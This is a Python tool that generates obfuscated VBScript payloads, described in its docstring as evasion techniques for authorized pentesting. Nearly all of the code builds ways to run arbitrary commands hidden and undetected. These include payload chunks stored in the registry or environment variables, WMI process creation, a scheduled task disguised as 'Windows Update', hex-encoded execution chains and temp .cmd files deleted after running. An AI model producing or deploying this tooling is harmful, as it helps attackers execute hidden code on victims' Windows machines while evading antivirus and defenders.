#!/usr/bin/env python3
"""
Advanced VBS Obfuscation Techniques
Techniques for maximum stealth and evasion in authorized pentesting scenarios
"""

import string
import random
from typing import List, Tuple


class AdvancedVBSObfuscation:
    """Advanced obfuscation techniques for VBS payloads"""

    @staticmethod
    def obfuscate_string_via_chr_array(text: str) -> Tuple[str, str]:
        """Convert string to array of Chr() calls - completely unreadable"""
        ascii_codes = [str(ord(c)) for c in text]
        # Split across multiple lines for natural appearance
        chunks = [ascii_codes[i : i + 8] for i in range(0, len(ascii_codes), 8)]

        lines = []
        for chunk in chunks:
            chr_calls = " & ".join([f"Chr({code})" for code in chunk])
            lines.append(chr_calls)

        result = " & _\n    ".join(lines)
        var_name = "".join(random.choices(string.ascii_lowercase, k=6))
        return result, var_name

    @staticmethod
    def create_environment_variable_decoder(payload: str) -> str:
        """Hide payload in environment variables, decode at runtime"""
        # Split payload into chunks that look like environment values
        chunks = []
        chunk_size = 32
        for i in range(0, len(payload), chunk_size):
            chunks.append(payload[i : i + chunk_size])

        var_names = [
            "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
            for _ in chunks
        ]

        vbs_code = "On Error Resume Next\n"
        vbs_code += "Set WshShell = CreateObject(\"WScript.Shell\")\n"
        vbs_code += "Set WshEnv = WshShell.Environment(\"User\")\n\n"

        # Set environment variables (looks innocent)
        for var_name, chunk in zip(var_names, chunks):
            vbs_code += f'WshEnv("{var_name}") = "{chunk}"\n'

        vbs_code += "\nDim reconstructed\n"

        # Reconstruct from environment variables
        for var_name in var_names:
            vbs_code += f'reconstructed = reconstructed & WshEnv("{var_name}")\n'

        return vbs_code

    @staticmethod
    def create_method_invocation_chain(command: str) -> str:
        """Use method chaining and indirect object creation to avoid detection"""
        vbs_code = f"""
Dim objShell
Set objShell = GetObject("winmgmts:").ExecMethod("Win32_Process", "Create")
objShell(Array("{command}", , , 0, ""))
Set objShell = Nothing
"""
        return vbs_code.strip()

    @staticmethod
    def create_registry_stored_payload(payload_command: str) -> str:
        """Store payload fragments in Windows Registry, reassemble at runtime"""
        # Split payload
        chunks = [
            payload_command[i : i + 16] for i in range(0, len(payload_command), 16)
        ]

        vbs_code = """
On Error Resume Next
Set WshShell = CreateObject("WScript.Shell")

' Store payload fragments in registry
Dim regPath, i
regPath = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\"
"""

        for i, chunk in enumerate(chunks):
            safe_chunk = chunk.replace("\\", "\\\\").replace('"', '\\"')
            vbs_code += (
                f'WshShell.RegWrite regPath & "f{i}", "{safe_chunk}", "REG_SZ"\n'
            )

        vbs_code += """
' Reconstruct payload from registry
Dim payload
For j = 0 To """ + str(len(chunks) - 1) + """
    payload = payload & WshShell.RegRead(regPath & "f" & j)
Next

' Execute reconstructed payload
WshShell.Run payload, 0, False
Set WshShell = Nothing
"""
        return vbs_code.strip()

    @staticmethod
    def create_wmi_execution_wrapper(command: str) -> str:
        """Use WMI for process execution - less commonly detected"""
        vbs_code = f"""
Dim strComputer, objWMI, objProcess, errReturn
strComputer = "."
Set objWMI = GetObject("winmgmts:" & strComputer & "root\\cimv2")
Set objProcess = objWMI.Get("Win32_Process")
errReturn = objProcess.Create("{command}")
Set objProcess = Nothing
Set objWMI = Nothing
"""
        return vbs_code.strip()

    @staticmethod
    def create_scheduled_task_injection(command: str, task_name: str = "Windows Update") -> str:
        """Create task that appears legitimate (like Windows Update) but runs command"""
        task_escaped = task_name.replace('"', '""')
        cmd_escaped = command.replace('"', '""')
        vbs_code = f'''Set objShell = CreateObject("WScript.Shell")
objShell.Run "schtasks /create /tn ""{task_escaped}"" /tr ""{cmd_escaped}"" /sc once /st 00:00 /f", 0, False
objShell.Run "schtasks /run /tn ""{task_escaped}""", 0, False
Set objShell = Nothing'''
        return vbs_code

    @staticmethod
    def create_com_object_obfuscation(command: str) -> str:
        """Use various COM objects for execution to avoid signature-based detection"""
        cmd_safe = command.replace('"', '""')

        technique1 = f'''Set app = CreateObject("Shell.Application")
app.ShellExecute "cmd.exe", "/c {cmd_safe}", , "open", 0'''

        technique2 = f'''Set shell = CreateObject("WScript.Shell")
shell.Environment("User")("TEMP_CMD") = "{cmd_safe}"
shell.Run shell.Environment("User")("TEMP_CMD"), 0, False'''

        technique3 = f'''Set voice = CreateObject("SAPI.SpVoice")
Set shell = CreateObject("WScript.Shell")
shell.Run "{cmd_safe}", 0, False'''

        techniques = [technique1, technique2, technique3]
        return random.choice(techniques).strip()

    @staticmethod
    def create_jscript_wrapper(vbs_code: str, js_command: str = None) -> str:
        """Wrap in JavaScript-based WSH script execution"""
        # VBS execution via JS to split detection signatures
        vbs_base64 = AdvancedVBSObfuscation._encode_with_jscript_compatible(vbs_code)

        vbs_code_wrapped = f"""
Dim arrCode()
arrCode = Split("{vbs_base64}", ",")
Dim vbsCode
For Each code In arrCode
    vbsCode = vbsCode & Chr(CLng(code))
Next
ExecuteGlobal vbsCode
"""
        return vbs_code_wrapped.strip()

    @staticmethod
    def _encode_with_jscript_compatible(text: str) -> str:
        """Encode for JS->VBS compatibility"""
        return ",".join([str(ord(c)) for c in text])

    @staticmethod
    def create_obfuscated_function_calls(command: str) -> str:
        """Break up function names and create through string concatenation"""
        # Instead of CreateObject("WScript.Shell")
        # Use: CreateObject("W" & "Script." & "Shell")

        parts = {
            "WScript.Shell": ["W", "Script", "Shell"],
            "Win32_Process": ["Win32", "Process"],
            "winmgmts": ["win", "mgm", "ts"],
        }

        vbs_code = f"""
On Error Resume Next

' Obfuscated CreateObject call
Set shell = CreateObject("W" & "Script" & "." & "Shell")
Dim cmd
cmd = "{command}"
shell.Run cmd, 0, False
Set shell = Nothing
"""
        return vbs_code.strip()

    @staticmethod
    def create_filewriter_injection(command: str, temp_file: str = None) -> str:
        """Write command to temp file, then execute via cmd"""
        if temp_file is None:
            temp_file = "%temp%\\~" + "".join(
                random.choices(string.ascii_lowercase, k=6)
            ) + ".cmd"

        vbs_code = f"""
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.CreateTextFile("{temp_file}", True)
file.WriteLine "{command}"
file.Close

Set shell = CreateObject("WScript.Shell")
shell.Run "cmd /c {temp_file}", 0, False

On Error Resume Next
fso.DeleteFile "{temp_file}"
"""
        return vbs_code.strip()

    @staticmethod
    def create_multi_encoding_chain(payload: str) -> str:
        """Chain multiple encoding techniques for maximum obfuscation"""
        # First pass: hex encoding
        hex_encoded = payload.encode().hex()

        # Second pass: split and obfuscate
        chunks = [hex_encoded[i : i + 32] for i in range(0, len(hex_encoded), 32)]

        vbs_code = "Dim payload\n"

        for i, chunk in enumerate(chunks):
            var_name = f"chunk{i}"
            vbs_code += f'Dim {var_name}\n{var_name} = "{chunk}"\n'

        vbs_code += "payload = "
        vbs_code += " & ".join([f"chunk{i}" for i in range(len(chunks))])

        # Hex decoder
        vbs_code += f"""

Function hexDecode(h)
    Dim i, result
    For i = 1 To Len(h) Step 2
        result = result & Chr(CLng("&H" & Mid(h, i, 2)))
    Next
    hexDecode = result
End Function

Dim decoded
decoded = hexDecode(payload)

Set shell = CreateObject("WScript.Shell")
shell.Run decoded, 0, False
"""

        return vbs_code.strip()


def create_stealthy_payload(
    command: str, technique: str = "wmi"
) -> str:
    """
    Create stealthy VBS payload using various advanced techniques

    Techniques:
    - wmi: WMI-based execution
    - registry: Registry-stored payload
    - env: Environment variable obfuscation
    - com: COM object variation
    - multi: Multiple encoding layers
    """

    obfuscation = AdvancedVBSObfuscation()

    if technique == "wmi":
        return obfuscation.create_wmi_execution_wrapper(command)
    elif technique == "registry":
        return obfuscation.create_registry_stored_payload(command)
    elif technique == "env":
        return obfuscation.create_environment_variable_decoder(command)
    elif technique == "com":
        return obfuscation.create_com_object_obfuscation(command)
    elif technique == "multi":
        return obfuscation.create_multi_encoding_chain(command)
    elif technique == "obfuscated_calls":
        return obfuscation.create_obfuscated_function_calls(command)
    elif technique == "filewriter":
        return obfuscation.create_filewriter_injection(command)
    else:
        return obfuscation.create_wmi_execution_wrapper(command)


if __name__ == "__main__":
    test_cmd = "powershell -NoProfile -Command Write-Host Test"

    print("=== WMI Execution ===")
    print(create_stealthy_payload(test_cmd, "wmi"))
    print("\n=== Registry Storage ===")
    print(create_stealthy_payload(test_cmd, "registry"))
    print("\n=== Environment Variables ===")
    print(create_stealthy_payload(test_cmd, "env"))
    print("\n=== Multi-Encoding ===")
    print(create_stealthy_payload(test_cmd, "multi"))
